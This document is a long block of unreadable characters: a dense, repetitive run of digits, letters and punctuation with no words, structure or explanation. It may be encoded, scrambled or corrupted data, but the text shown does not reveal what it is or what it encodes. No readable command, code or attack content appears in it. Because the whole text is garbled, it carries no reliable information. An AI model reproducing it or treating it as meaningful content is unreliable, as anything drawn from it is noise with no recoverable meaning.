48D5-4v1(>4tDStS1r #44D1UrcU Srv4 Icc4 1r>1UtSSD8  S1rt1S>8U(cIv>8-.v /1I4rS--vv( 4r>4-Iv>(18vDcU cQ(441DDUUSU>(r 1#U4Sv >rU1St>UD8(rr11t>SU8-VvI8>aS4rvA>IU>S-vv ()I4>1USvU(S4vDvUNvr(144NSU-cv  r_D4UIc> Uc41vt SW rr11>tUSS8c5 I3t4Uc8>MUIS>v-Sv==4I1((ItD8-t4 1t-4v1(> t DrU1(vi8v(Ir11cvSS#8zrS18t4SU t, Uv-cS(v(({IStI{SIS> -!84S! >>UU(vv( 4_r>4D>I-tc 9v44D(t-c( 1UUcr vr 1s4(I.ttSU(>xD1-tcS111>8SU8SMvvthr4&>--IvU5-I->-(g4 >1->vUUIvc(Drvv4 v4>DUUS>vt(S8 -2O18t-Sv1v> S{ 4r1( BII8tc-;8rH-I+U1--vc(U1 >(U;cJ>>U(vS(v4 rIIrD8UUc( >rtDSUcr(cS 8r(DrUIcDSttI 1?81UtSSv-cSU rk41DtD->8t(v-;vvR1I>>UIc>8crv((-4>v>(44SDvU t8Svc4(DrcDD cr 18U4c1 >rUvS(D c-Wr4I t>SU8Sv-846tI8>>-4IU>I-vv (w 4(UID1(-DcS cUacc(14>DU1D1 U8c  >r(D4 U^(1vt SM-cS(84ID14tIS48v(,I(>U3UIr>v- v{cSv(VD4vD>-1 v((rov1(r4UDSUv1 U(c- 4rIcU Irv1 t&1ct(S4 rrDI >UjsIvt1S>8Uvtv8(*IS>--8I>D(-Svv( 8rxI1(DU-Ic8(I4-18cc41D>UUSUDDr 1:U4-  >rU1S>S-I8Trr11tDSU8SZvr DDS48I0>It>S->v 8+4D>1-DvU(-4vDrUBS48S4>DtUScc  xtD4>1S4 Ur-1vt8S.8rr14>>1SS8cO I(t4U<8>^Ur4>v-8vo(#I1>>-UvS r4 Db-4v1(>4>DSUU>2 (44D1D4cU -rv4 Icc48(r>11tSSI8  K 8t1Sr8U_DIv>>-Xc*}rI>>4-Svc( 4h>4t1vr(U41DvUUcm8Y41I>>wcS >r 1SU4S7 >(U1-tvSU8kwv11>SSUcS(UI >SS4v />4(>StvcS(?4v>1U*vU(44vD I4vr (4>DIUSc>  (!g8U1cr UrD1vt1S}cvrt1>tISSvDC I(t4-18>H1 v>c- vg cI1>D-Uv>S 48DF-4U;(>4tDStS1r Br8D1t(cU Srv1 I-cr8(r>1ttSSc8 ( I t1Sr8U!tIv> -Mc4 UI>>4-SvU( 4t>4t1v4(U41DvUUci 141D>t/cS Dr 1)U4c1 >rU1DtvSU8<+v11>(SU8S(8I >cS484e>It>SUS-D(J48>1t(vU(S4vD UDv4 (4>DtUScS  (CI U1cr UrD1v>>SCv4(-1>tISS8t. I t4- ccAUID>vtUvE;rI1>D-Uv>S 48D9-4- (>4tDSUU>G (44D1DccU -rv4 Icc48(r>11tS-t8  ;(8t1Sr8UPDIvDc-#SvJII>>I-SSr( 4(>4UDv>(18vDcU cGvt41DDUUc>- r81KU4-8 >rt1S>SIr8kA811trSU8Spv4v(IS4v P>4r>S-vv (d>->1UfvU(-4vDvU&S4S(4>D4USc>  !UD4>1tr Ur11vtUS<8_r11>r S-8t. I t4SI8>(>IU>v--ve(cI1>>-UcUI44 DS-4c-(>4UDSUvc4 or8D1U1cU -rv1U> c4 1r>I tSSc8 7 14>HDU8tCSIv>1-i8rs1I>(w-Svv( 4(>4-1v>(U4SDvU cH (41D>UUcS tr 1oU4>Sttc>7rrUS 81r411t>IDtD-U8c#1I->1S1v-u-4S>S(/4 >1->vU-Ivc(r4cc8(14>DUtUI(  r}D4U4c> UrSISJrS: rr11ItUSS8v  (ct4SI8>ftIS>c- v9(>I1>>-UvU(v48D7-4Dv(>4UDSUcc  y44D1U>cU Srv1>tic4 1r>IStSSv8 c888oU1rtD->rv4rIr>1-rv4.I4Uvv(-4k>4-1D>-Dv- C44cW Y41D>UUDcSDr 1vU4c1 >Sr -rIIS8=!v11t>SU-t-8v}_SI->89>Ir>S-vv S v8(Ct>UtUvcUD Utv4(14>rtrD1Ut((s&v4I11tcrS1Dt S2 4S8 r211Itt-zvSDvS18>zU4U (- vAE440>>-UvS(v>DDb-4v1(D4UDUUvcUy-44D1U>cI Src1 t(c48NvU1ttSSv8-3B1rt1S4USm-Iv> Uc84?II>D>r8vv( 4/DS-1v>(U4S-IU cY(44ID>U>cSvv8-1)U4c1 >rU1DtvU -cr411t>SU8S+DI >Sv-81&>IU>S-vv8(.I4>1-4tS(-4vD U0v4(I4>1>e8cv  rx1(U1c> U(S0tt S! 4r11>ttSSc>/8Igt4S1v>/UI->v-Uvf(  >>D-UvS v4 D(-4cbSU4tDSUvc  )4rD1t1Ic Srv1 t c4 1r>14DrSc88OL14t1SD8U9-Iv>  U84L1I>>U-Svv( 4,D>-1v>(U4UDvU8c<  8>DDUUcS vr 1(U4c1t rU1StvS88!r411t>St8SYvI 1rS481M>IDU (UUSciI8/8c>U-(t&8t1crvI41ccvt1vcv >rLD4U1>>t-St IAS1ttIS>1I? 8rU4S(DvSv(D->9UI1>v- vec(  (1ItD8-t4 Dc-4v1(>8c c4UD-U144D4U>cU Sc8#ttQSv 1r>1UItI8>*SS8-s8S>81=SIv> I-tr-t8r>U-tvv( 4xr-4rUD(U4IDvU c&Ucc( 44rDDt SU1}t-c1 >rU(8rc1tt4S-vVzr11tDFvI->+S481c4v((>4o>-(p4 >1->vUS>vt >rvc(4(rc1c1S cUIU(-1U1S8 UrS1vI8Ic> SD4>I41->SSrI7>4S18>+U(4(tIr>(-1vD(8I1tUU8c( v14>IU1c1Dt1(U11  I11S>4r4vrv1It=c4 1v( IK>>-t>St8>isI1tI-vI-UlvIc >1t(-81cUv( 4D>4-1v>Svcc(-48D1S4cU(D_(DDtSrct18 >JS>4I(I-v (89s811t>SU>SSc8D( 4(81w4IU>S-vUr-(v-(>-I>%pS4 I(--Is/->tDDUScv  rmD4U1v>S-r-1vtc>-tcr0St-4D->1v?I8Uv>DI44-Dvt>(DUu}4Ir>>-UvSU v- -U(v1(>4UDSUvc  * 4D1tUcU SrvYUrt11tLvC8(oUI->Sv88SfcISt1ZSID> -d84c48rA1tSUcUicv>4UNv>(U4S D48Dtt 411LUUcS v8c 1r-1(tUS11StIS 8,r4?r3 1t>USc8c(vI8>4B>I1>S-vv S8v- SIrvU(14vD U6>I-D8-(t4r1   r-D4U1c>SISv crv11t8SG1>>SSS8v+  8{8IUtrSDv>1vDr>r-1vr(4IIDU(v4DD6-4v1S vI(-r=1SUU8%(Ir1cU rrv1 t0IctDS188?tIvt8S888trS>8UJSIv> 1A1 v1I>D(-Svv( 8rGI1(DU-Ic8(I4-18(4r8D>UUcS-vc4 (=-1(t1SD1StDS 8<r4  rr1D>>-8vvI8S484G>IU>S1Ut SII4>1->c>>I4vD U3Sc(14>DUtUSS  r(D4tcc> UrS4v> S3 rr11DtUtd8v  Irt4SI8>ltIS1>- SdzrI1>D-Uv-(v*4D;t4SS(>4tDSUcc v844I1t-cU -rv18t2-( 1r>rGtSSc8 H 14t1S>8U (Iv> -.84#1I1>U->t (84A>4ISv>(t4SIvt cG 841D4UUS) vRvU>U4S8 >r41StvS 8f(-11trSU8IuvIv>a-v 8E>II>SUvv ((I4>I->v1Sv4cD U,c4(14DDUU>>  8rjD44Sc> trS4v> S)88r114tUUS8v(vt>t4-88>8(IS>v- v2 -I1>r-UvI(v4vDNUv c(>4IDSI4c  (44D1U>c1-vrc1 tLDU 1rD1UDS>t8 #c14>ZS>S(BSrv c-3v8R1Ir>UU4vv8 rV>4U(v>(I4S1(U -G8D41DrUUcD vCO1V>KSS >r41S18S 8?r4I4>ISU8IzvI->pS481 >4->S-Dv (-I41>->c> G4vD>U!c (14>DUtU(>  rtD4>ac> UrSISttSP8Ur14-tUSS8v(v41t4--8> (IS>v- c  UI1DS-US (v4 D{t_cm(>rcDSt>c  u4414ttcU8vrv1vt_c4 1u114tS-88 (>14t1S>v>IsIvD -NvIA1I>>UUUu4( r(>4-Iv>(U4S1S8tc78%4111UUcS vTvIcU4Sr >((1StvS 8pA 11>(SUvt/vI >,S484b>I4>S-vv ((I4I tvvU(D4vx1UJvr(1eDDUU>>  8rfD44Sc> trS4vI-Sx8vr114tU--8v  r(tr- 8>.4IS1t- c  -I1D(-U-v(v4 D9t4Sv(>4rDSUDc 844414>ScU 4rv4(tic4 1#14 tSSI8 (r14t1S>v>KDIv>1-&cUy1I>>U-Scc( 4->4USv>(>4SD>Ivc( v41(vUUc- vrt1=t >> DrU1S44S 8(r441IrSU81lvIS>{-r81 > I>S->v (SI4>r->c> t4vDtUzc-(14>DU>S-(  r-D4t8c>ccrS4v>tSw8cr1I(tU-D8v  Ict4-88>)rIS1U- Se(DI1D(-UvI(vr8D^t4S((>4rDSUDc  844D14Uct 1rv1Ut{Sc 1(>LItSS>8 ?S14>US>c4!8Iv>U-6U(W1ID>U>(vv(S 4>r-1v>cD4SDcU cvS14ID>UUDG vr81N>pIt >r41SDSS 8xr4114(St81yvI8>LSr81(14t>S->v 8rI4>1->SU v4vDtUkc (1rDDU>S-(  r-D4t8c> IrS1v>1Sk8Sr11>tUSS8vQ 4Dt4-88>+rIS>1- vn 8I1DZ-UvU(v48DPtRUr(D44DSUrc  644D1t cU 1rv18tJSj 1(>1ItSS>8 +S14>vS>cU*UIv>U-Tvvs14>>U-1cU( 4S>4ISv>(t4SDvU cvS14ID>UUD_ vr81*>yIt >r41StDS 87r441IrSU81^vIU>NtS818l-v>S->v S>I4>I->St(S4UT)U(v4(1vvDUU-cvv 8cD4t c> 1rS4It U&-8r1IbtUS18v tIk1vSI8><4ISr4- v(n4r->>-1tv(c4 DmIUv1(D4UD>I c8 ,44rrU>ct Sr>IvtGc4 1mv1Ut-Sv8vd#I 4>SD8UXSI4> -(84&1v >U-Svv(84y>4-1v>(U4SDvU -D(441D>UDcS vr 1.U4c1848U1StUS 8Or4v8rDI(>>aSI >tS481B>rIIS>S>Sv>N8I1>1>1(SrcD Uxv4-1v>(UrrDcUrc11UD(D4c- -rSt11fU4c11>t1SS8v. 84rrIttr_UID>v- vF-(vD(S4-DU(-4 De-4v1(>M/UD1vc  c44D1U>14U-S68-rcc48-r>1UtS1Dt8SI88D1DUtt-88t1 >>84(fI>>U-SDU-8c8(t-1c((U4SDvI D1-rSc(rr>1t vrt1bU4c1-rSS8() I(>-S111>0SU8S!vvc(v4H>c-U8r>S-tv (,I4 248D1U vtD IIv4(14>(U4SDvU4Sc(rtS1(UtS8 t11>-t8-m(IrIIU>>SD88G8tvc1c>8D(vI4>t-(8I(4II>>S-cS(rr6>IU(vIIU>IUB-rvIGr4r1>t1ct8vI IVtD-(8DrDISS1vt81( It>8SD -n-4 Dv-(v1IFtUDU--v1(841DtU>c>IS>4-JvB(( I>>-rUvc  6Urc1 >!c1StvS tpc4 1GRI(>424r-(8-Ut1S>8U>S-Dv (LI4r14S>t-tvtrD4vv4  4>DUUSDtUrc  8rw1I Urr1vt SJ-4SU D((1D>S-cr=IUS1vvOUIS>vD4>rUcr1rIIIDUU>v-  -4c((>4UDS4>D4UrcI 4U>c1 Srv1 I4Drttcr1U>XSv8 &V(cG(I4UU- 8c(DIcD{-rI>>U-Svv( 4dDD-1v>(U8t(trv1SU8c4I>I1Drt(c-431Uc1 rrU1Stv>1trSR(cr4SU81{vI >*Iv>D-1vcj-4Uvc(iI4>1->vU(S8 r U8v4(14>DUUScv  r#D4t c> UrS Iw!11t-S> rtUS48vA I24UIDt18c(r+Ut ->((I1>>-UvS(v1 (rDrv1(44UDSUvDtU(cD (UIcU Srv1 tZc4tc8>1Ut4Sv8 Gg (rrI1>(-SvU1 >>84( I>>U-S>>-Dvc(>45DI(U4DDvU cEU4vr(Drv1  vr11CU4c1-IS1 -6UI->8v(8Dr41I8S_UI >NS4>tSDv1#4-vc((/I4>11>D>-rc>(8rvD8Srvr >r1Dttv8t  U1SU UrS1vr 1OU4-c DXcI 84 -v8>U11t>SUS1>v- v2 wct>>-UvS8-4 DL-4S1cr4UDSUvc  !(UD1D^ct Srv1 ttc4 Ir>1DtSSUUQw(14t1-88UV-IvDv4I84b1I>1D-Svv( xyr8-1v>(U4SDv>1cXvv4ID>UUcS Ir 1(U4-S >r1(vtcS 8%/-11tDSU8>c I8>FS411g>It>SUSDr(YI4>1tIvU(S4vI 1cv4(14>DUUSSM  (Q14U1c> UrS1v>DSO 4cr1DtUSS8Sz I t4S1tr<tIS>v- vfk4I1IFUrv-(v4 8--4vI(>4tDSUU>n (44D1((cU -rv1 44c4 Ir>1UtSSv8 0S>-t1SD8U(>Iv>8-P8431I4rS--vv( rv>4-Iv>(18vDcU cA>c41DDUUSU>(r 1(U4-r >rU1SDv>-8wrr11tDSUc Xv4v(IS484W>rr>S-vv ( (S>1-IvU(U4vD Ujv48r4DD>UScS  r8D4t4 v Ur>1vD(Sk 4r1I1S SS8t5 4rt4S18>Q4DI>v-vvx 1I1>D-Uv-(v4Sr4-rv1(>:SDSUcc  v81DIU>cUvrrv18tp-{>tr>14tSUI8 wh14D1>r8Uj1Iv>U-yccW1r>I>-SvD( 48>4t>v>(UvtDcUUcC /41D1UUcSr4r 1vU4S  >rU1S>SIr8YAv1118SU8Skvr 4cS4v k>I4>SUDv 8Qt >1U(vU(t4vI;Usv4-r4DD4UScS  r D4U18v UrD1vtUS7 4r1144SS-8v) rtt4SI8>(>c8>v-Uvd(1I1>>-USSct4 DS-4c (>icDStS(1 mrcD1U4cU Srv1 S>c48vr>11tSSv8 mF>Ut1-88UXDIv> -^84 cI>>4-SvI( 4 >4U41-(U4IDv>ccj(441I>1IcS Dr 1-U4Sr >rU4UtcS>8Or411tDSUSSvlI8>US4cvJ>4c>SUSDr(A4->1>(vU(S4vDU>tvr S4>DUUScc  r D4U1(  UrS1vt8SK 4r11>18S-8v_ I-t4S18>eUrt>c-Dv_(lI1Dv-Uv14I4 Dt-4UU(>4tDSUvc  v81DIU>cUS rv18tFc4kSr>INtSS48 5914>iDU8t_SIvI4-p8r31I>1>--vr( 4E>4-Iv>(Uv8DvU4cm(r41D>UUcS8>r 1IU4c1 >rD1S1v-r8}jD11>tSUv1WvI >vS4v><>II>S-vv (yr8>1UtvU(S4vDcUk-48 4>1-USc>  wcD4t4Sv UoS1v>FS% 4r14>IISSvva 4Yt4Ut8>(>>Y>vU8v;(8I1>>-UvS444 1 -4v1(>4UDSUvSD Xr4D1t1cU UrvI l c48Dr>I(tS-v8 89l>tI-t8U SIvD8-<84 4IDDU-Svv( 48>4>1US(trSDvUUc!8t41119ccS8cr 14U4c1 >(UODtv-88pQr11D-SUvU14I D S4v47>IU>S-v(1(mr(>1U%vU(S4vD ttv4 I4>1DUScS  l;8VU1S> Urr1v>8Slc48U1D>USScvJ 4(t4S1c1pt4->v- vn((I1I>Dvv- c4 DS-4SI(>r>88UvSv zr1D1U>cUvS8t1 > c484r>4ctS-Sr1g%4(t1tc8UZSIv> v>84 YI>>t-Svv( 4a1--1c1(Ur>DvUvc^ 41vD>ttcS Ir I U4U18trUI-tvU 8.yr11t>Uc8S(SI >QS48rg>!UD4-vcv(l4v>1UvvU U4cD t8v4 >4>DUUS-v8Dr5I(U1SI U(81v>v-- 4(T1>18SS8v, rX>:S1vr9UI4>vU>vNd4rc>>UDvS t4 D -4c1 I4U1UUvcD Q3(D1D>tv -0S1 D=c48Ir>1UDUScvc?E14t1SI8U8S({>8U884( I>1I-ScSUr4p1 -1cU(U4SDv> tc(4#FD>t1cSv(r I cUc18rrUIStvS 8^r4>St>-48SfcI >wS481 8IUD>-vcU(C4b>1U>D>(Sr-D Utv48W4>4U1 cc8crTI4U1SD UrSUUt S4 4?r1>ttSSvv-vIZ>DS1S:uU4v>v> -1xr4t>>-rvS8S4 D+v v1 S4U18Uvc8 yr4 4U>S8 SzU1 t1c484--1U> Svctp?14t1-?S(3-4(> -(842II>>D-Svv1>4j>4-1v1(U4SDvU TU(441D>UDcS vr 1PDtcI >rUI(tvS 87r44rtD-v8S<SI >IS4v 48IUD -v1-(kIr>1->vU(>8 D8U+v4>(4>DtUSc>+tr?1DU1IU Ur-1vt8S*8 v>1DtUSSD _ I(t4-^UUktIS>vr-v/PrI11>DIvS  4 DI-4-v(>Y4D-UvS9 m-9D1UDcUv>rv1SI4cr 1r>v>tSSc8 Kv(1tIS>8UUDIv>8-o84cDI>DS-Svc( 4j>4-1vI(UrvDvU cY(441D4ISc- vr vcU4cI >rU(ItcS88Mr411t>SU8>c I8>uS4115>It>SU cI((Ir>1hvvU(-4vD U*c S>4DDUUSI4  r(D4tL>U trS1v  SJ rr11>rSSS8cN Iit4S18>u4>r>v-8v}tDI1>D-UvS(v4Sr4-rv1(>-cDSUcc  x8ID1UDcU Srv1 tsc4 rr>1ttSSv8 ^214>_DU8tySIv8 -C8rB141 c-Svv( 4D>4-1v>8U DDvU c0(441D1UUSU44r 1(U4Sv >rU1StvS48?r411t1SU8-evIS44Sr81m>IU>S-cv (yvS>1->vU(-4vD U,v4(r4>DUUScc  rXD4U1SU UrS1vIt1c> v181=-1>>tScvv4-I>>9--I1>v- vxX48>>>-UvS(v4 DP-4S1 >4UDSUvc  =4rD1U>DS SrS1 t(c4 1r>1UrcSc8 ;:I&t1S>8U<Sc*> -:84}1I>>U-Svv->4g>4-1vD(U4SDvU co(441D>t8cS vr 1pt c1 >rUNUA81S>tr4Iat>SU8Scv (r81 81(vIU>S-vU1S8 Ir>DrDS-tc8(S4cv4 84>DUUS1SU-S(88r(1It1rS1>t ST 4vt rl114>8SSI_>4S18>6U8-(v4 >1--8rBD41>rU8c,Ir4UDrUtcSDSUDc  *44Ov4rDtU>ct8vj8c48Ur>1UtS>->(S4v ?(IU>188 U(D4G>8!14S>U-Svv->cv  41>tU>vD cr-Dct(S#D>UDcS vr (cdj1U >rD1StvS >8--8>IUSU8SVv4v(IS481R>48>S-vv (S1c>1->vU(>4vD8Uzvr(144LSU-cv  rvD4UIc> 1vv1ct SCv8r11DtU-UD(5 Ibt4--8>aUIS1vvSv,94I1>>-Uv>(v4 DS-4vI(>4UDSUUc  )iSD1U1cU Srv1 t!S48>r>1ttSS48 W 1411U88U/-Iv>--KvW+1I>>D-SvS( 4/>4-Iv>vUr-DvUvcO S411EUUSStSr 1(U4S8 >r>1Stv1y83BB11tDSU8SZvr DbS484^>I>>S--v (j81>1-4vU(U4vD Ukv48c4>D>UScU  r D4t111 Ur-1vt8So8,r11>r-S-8vB I(t4S18>VUc >v- vF_4I1>>-Uv>S 48D_-4Ut(>4tDStS1r i44D1U4cU Srv1UStc4 1r>r,tSSc8 gw14>*DU8t!SIv1>-:8r)141 c-Svv( 4v>4-1v>(U8cDcU8c%(441D4UUcS Ir 1 U4c1 >rU1S>vS-8yrr11>vSU8U6vQ D8S48Il>II>S-Sv (u4(>1-1vU(S4vD8U:-4 r4>D>USc1  rSD4t1SS Ur-1vttS98%r11>tDSS8S% I(t4S18> U44>v-vvK(WI1>I-UvS S4 Dv-4v4(>4UDSUvSD Vr=D1U4cU UrvI 3 c4 Ir>1ttSSS8 BF ItIS>8U7-Iv> -?84UUI>>U-Svv( 4#>4U*tU(t4SDvDrcO(r41119ccS vr 1tU4c1 >r4trtvS 8/8t11tDSU8S9vIS44Sr81B>(8>S-cv   cD>1->vU(r4vD Ugv4SD4DDtUScv  rvD4U1-( UrU1vt S/ 4r1I>D SS8cJ I>t4S48>8UI4>v-8vn(8I1>1-UvS S4 D -4v1(>4tDSDvS- HrnD1t cU 1rvI >tc4 Ir>1rtSSS8 6)4>t1S18U}-Iv> -Yc4  I>>>-SvS( 48>4-1S8(U4>DvUvcd(441D>>(cS Sr 1vU4c4 >xU8UtvS883rr11t1SU8SS8I8>6S48Il>IU>S-vD4(_I4>1->vU(S4vDS14vr(14>rcUScc  r}4vU1c> UrS1vt S_ 46I1DtUSS8Sd Ipt4S1> aUIS>v-8v#G4I1>>-UvS(v4 Dv-4v1(>4UD>Uvc  Pcc(Ir-DI S%D1 t0c4-8cr81481I>5-cv ,(II-tS1vUs-4 UD-c84(SIr>D->cv>4USv>(U4SrD4-1v-(c( 1r4DrU-c-15tSc1 >rU( rI1ttU- 8chU1r84avI >LU}Dtu>IU>S-cv (JI411U>vU(S4vD UQc((1r1U UScS  rvD4U1c> U4r1vt Sj8ur111tUUSvSb I)t4S18>,>IS>vI(v(J4I1>D-UvS(v4  1-4v1(>4UDSUvc  mcSD1U>cU -rv1 thc4 1r>1UtSSt8 5B14t1-M8U0SIv4cIr>1- v8Ar-Sv>( 4k>41t18SSv- (4-c! S41D>UUt>UISc8v4r1>UIcI1StDS 8&r488rrI1tIStvY(SS4v><>IU>S1tD -v8r }Ir>-Stvt SrvD-U>c(1 UScv  ,  vUIcD Ur>1vt S* 4((1>ttSS8c^ I t4U1vcnUI->v-8v0_rI1D>UFvS(c4 D8-4v1(>r>1vUvc8 Er8D1U>cU8U5D1 t c483r>1UtSSv8cLiI5t1SD8UaUIv1 Dc84Y4I>>>-SvS( 4ZD>-1vD(U4UDvU8c#(4cvD>UUcS cr 1#U4cI >rU1StvS-8br411t>Sr8SbvI n-I8Dp-(8I(v4>v (4I4>1->tIUSvU(8rvD8-D8I(Ir>1UUDc4 cU1Sg UrS1vIrIt-1cI8-rISS8r! Izt4>r> --vc(-I-SxS.vD(t4cvS(>4 DN-4UrUtcS(14IDt >44D1U>S>U1rc18t/cr 1r>1UtSSr8 O(14tIS>8>LSrv>--38r,1ID>U-Dvv  rt>4-Iv>(14SDvU S 8v41DDUUcU vr 1h>GSv >r>1StcS 8Kr411DSSU8UTvI8>+-b81 >(I>S-Sv ( I4>r->vU  4vD8U,cb(14DDUUSD1  rwD4UIc> UrS1ct Sz 4r11ItUSS8vk Ict4S18>-U8tLcI4>1L4r>>>-UvSctcv  4ID48>c-(t4-1-t SC (44-UUrS 4 IS>4-r818-NcI->SScveISU>8UF>Iv> -)DcSIv1(SU8vv( 4*DeDvv>(U4SDvU cG(4r48-UUc- vr81LU4c1 >I 1StSS 8^r411t>SUctAcI8>2-581C1IU>1vIv ((I4D8->vt(S4vD Uvt1(I4>DUUIcv 8r#1 I>cD UrSI}t S( 4A4v-tUSt8vHcIPt4S1v1I IS>U- v Y4I1>>-U l(v4-D&U?v1(>4UDS8Sc  v441<U>cI Srv14tuS( 1r11Ut-Sv8 SU14t1S>8tuSIv> -H8rQ1I>>UUUvv( 4;>4U(v>(U4S v4cD(U>cUD>t cS vr g _51ct(Sk8>& 1->8-(11>NSU8Sgv(UGrIcU(-U81>S-Uv (jI4(8IDDc-D4vD-UVv4(1c>(t4r1Stcr(D4U1S  UrS1vI41ttcSv84C(IvtD# I4t4S18>vr8D(UDS>cU(8rmr4S>>-cc? vr(v1 D4UDSUv>tU(S  (r1>1tUcc8&#814UIS1 IRv1->D?MI-t1S>8UcIv8(vIDD(-18D5DIDvv(I4Y>4-1t(-Ic>r-4>DtU>cO 14I1v -r 1+U4c1 >rU1StvS 84r411t>Drt--U8-( 1ctIUM8Irt4v>--cv >1U-vU(S4v3t4(1 U(c1ar4-1>U-v8 -=SDr U.81vt So-cSU8tr>1->Ecc8UrrIB>t-rvt>-- vaM4>18 8DvScS4 D--4v1(>81(DrS1vU(c- >U>SU Srv1 4-Dr>Gcr8>4U1ttUS188rrI4tt-v8-h->(84{1I>>U1cvv( 4H>r-1v>(UrU8(U c((4r%D>UUcSvv8-1jt,c1 DrUICtvU -cr41rt>St8SaDI 1nD881}4IU>U-vc8(_rH t->vI(S4cD U&v4  (8DtU1cv  r6DrU1cD UrS4rt8S# 4rr1>tUSS8vc1I(>8S1810UI->vUvv1M44(>>-tvS(v4 DS>-vI W4UD>Uvc8 =4rD1U>U8 -rv1 tvc4 1r>1U8-Sv8-bLI+t1SD8U8S4-> -v84(>I>Dv-S-v 447D -1c-(Ur DvD cv(4rzD>t>cS8pr rOtrc1 4rU1rtvS48) 4IDt>SD8S(8I >SS4S1(4IU>t-vvc(s44>1>>S((S4-D U v4 U4>1>UUcv -rmDrU1c> UrUr1t SS 4rr1>tUSS8vc1I(>8S181%UI->vUvc(:44(>>-IvS(v4 IaU4v1 l4UD-Uvc> &444vU>c4 SrD1 tOc4 1(c1UtDSv8 {bIct1S4USV-Iv> t 84OII>D>r8vv(14!>r-1v>(U41IIU8cD(44ID>UtcS Sr 1mDtcI >rU1rtvS 8ir4r-tDSU8SevI >*S481(SIUD)-vvv(TIr>1->tr(-41D UPv4(14>D4tUcv -r%I>U1cD UrU1vtS>4 rr11>DvSS8c3 4 (DS18riUID>v- v? 441>>-4vS(-4 DD-4v1v 4UD1Uvct g44D1U>-8 Srt1 tTc488r>114vSc8 x6r1t1SD8U(Uc(> ->84YII>>U-Sv>8D4(Dt-1v1(U4-DvU8c/(4(-DDUUcS Ir 1kU4c18SrUIAtvSv8?rr11t>Dr8-e1I >zS481#>I4DU-vv-(F#->1-DvU(U4vDS14vr(14>4(UScc  rK SU1c> Ur-1vt Sb 4;(1>tUSS8-H I2t4S1vDCUIS>v4c>cU vv(8I1>>-tc3 #r9DDU>vI UrU1D :rUD1U>cU->ct crU11tDSS8-rIII8cxV14t1S>8UlSIv4 -S84P1I>D>r8vv( 4_>r-1v>(U4S( U c((441D>UUcS8SD11;t5c1 1rU1Stv-vr>r41rt>SD8SfvI >kc4815>IU>t-vv8(_I4(v->vU(S4cD U_v4(14>DUUScvv_r!D4U1c> rrS1vt >ct1cI 12v1DtU7 I-t4S18>cUv yc4cDv--8r>>U(vS(v4 rcrSD1USc- t4I1(U444DrU>cU S8I8cI(c48(r>1UtS>Ut-S8 r5US>8I^SIv> 1vDXSIv8(v-Svt( 45>41rD-U-c((tU cv(441D>14DrtSc-1(U4c18trU1Stv>ctr-j8>rrI>UISt8SL-I8U1SDv>(>-vvr(,I4>1D1Dv--c- SId1wU(cI DrD1SU-r8D4U1c> UrS1vU tr 4Pv1>tUSSUkSD8S084L>8-c8D>v->vNz4I1rI4U>-USvI(148Dr(ISSvnI(UU(SSbr41IcU8(rv1 tM>/tUcD8DZ>DSt8Sv8-((II8U_IIv> -}t -(c (14DDS--4?DS-1v>(U88(trcDUS4vI 1r1cS88r 16U4>1UDS>8>rI1ct1S8((6-I(>>-U8-( S4vcN>IU>S1U>-UUc  (41>Icr UD Uvv4(14>KU4-1StSrl1tU1c> UvU trU11t8cr84rtIvt-S-IB>SS18>OU 8hc4S>cUJvc<D4vvS(t4 DL-4>(UUc( cr c  844D1U>1SUDSD1ct;c4 1r>1UtSSv8 uTItt1S>8Ucvvt#rI >8-4 1et4v>D--4yD--1v>(U8t vr(1vS>cc (rj1> vrD1lU4c1-4S>8DA-IcUOcr84)4SUv fvI >M1 >4SDvS(t4v>8U v8(>II1(tS4vD Ubv4Ic4>DUUScv  rnD4>1S( UrS1vt SY8 r1I1D(SS8SO 4ct4S18>5Ur8>v- vl(RI1>1-Uv1 D4 DQ-4S-(>4tDSUcc  v81DIU>cUv(rv18tic4U>r>1UtSSv8 2H14D1->8U;SIv> -Kv ;141- -SvS( rU>4-1v>(UrrDvU c^ A41D1UUc1rIr 1AU4St >rt1StvS 8vv11It>SUv8gvI8>V- U>6DIU>SUrv ((I4>1IUvU(S4vD U;v4(1M>1UUScv  roD4t{c>8>1R1vtvSF8Ur11>tUSSvIB Int4S48>P>IS>>vDvfh4I1D4-Uv-(v4 DjU t>(D4UDStUc  (441%IUct SrvIIt;cr 1r> StSSv8 i/14t1S>cU(SIv> -p8401I4>UUUp4( 4 >4ttv>(U4SDvtDcx(441D1UUcU vrU>-U4c1 >(81StcS 8(r4IO4USt8Swv4I>/Sr81y4 S>--vv 8{I4>I->vU-v4vD U<v4(14>DUDStG 8ruD4>8c> >rS1vrYSA 4r11>tUSS8v8 ;1trS18>(4ISD4- vvc1II>>-U1c(v48Dk-4>>(>4UDSUvc  i44I1t>cU Srv1 tlS  1M1t tSSS8 Vc14t1S>8U(rIv> -lvG31I1>U-1(I( 4T>4>8v>(t4SDvU cvS14ID>UU-I vr81Lt >> DrU1S1SS 8(r411rUSU8S6vI >}S481 >4U>S-vv (}I4D+->c>4z4vDvUlcr(14>DUUSSI  rJD4U4c> >rS1>-tS/ 4r1rUtUS-8v<8IQ> D>8DAUISI - v(644arU-tvS(v(-DG-rv1(>vSDSUvc  (44D1U>c4*Irv1 t}t5 1rD1Ut-Sv8Sv41rt1S>S>0SIc> -vU1LII>>U>Dvv(840>4I>v>(U4SDvU cK(4(1rSUtcS v({1{t>c1 4vS1-tvS >rr41It>SUtvdvI >2S4816>IU1SUvv (GI4>1->v1(SrS-1UfcP(1rIDUUScv  ZtD4U1c> >rS1St SSZ-r11>tU> 8v,8I_t4S184cSI->v- -1)4II>>-1tv(c4 DW1(v1(D4UDS4 c  k44D1U>cU S(vI t#c4 1r>1Ut>Svvv1>14t4S>84xSIv> -Hc-_1I>>U-Uvv(v42DvS8v>(U4Sr-U c((44ID>U1>v cr 1aI(c1 DrU1>4 S88Kr4(St>St8Spv8n>uS481=>IU>S-vcv4rI4>I->S8(S4vD >ZS)(14DDUU-cv8Dr^IuUrc> >rSI4t SH 4r1IDtUS-8vLvIR>:S1v>(SIS>v- vIi4II>>-1cv(v4 D:rIv1(D4UDS4 c  A44D1U>cU S(vI t!c4 1r>1Ut>Svvv1>14t4S>8DfSIv> -Zc-f1I>>U-Uvv(v4sDvccv>(U4SatU c((441D>U1>v cr 1+48c1 DrU1Sr S 8Cr411t>SU8S8vz4>(S481(cIUD -vv S4I4>1->vU(S4vD DOU>(I4>DUtScv 4ri1 I>cD UrSv8t S( 4r1 UtUSS8vV I,t4S1c>(UIS>v- vNE44%>>U>(;(v4vDlUSv1(>4UDStIc  b44D4U>c> Sr>>tt_c4 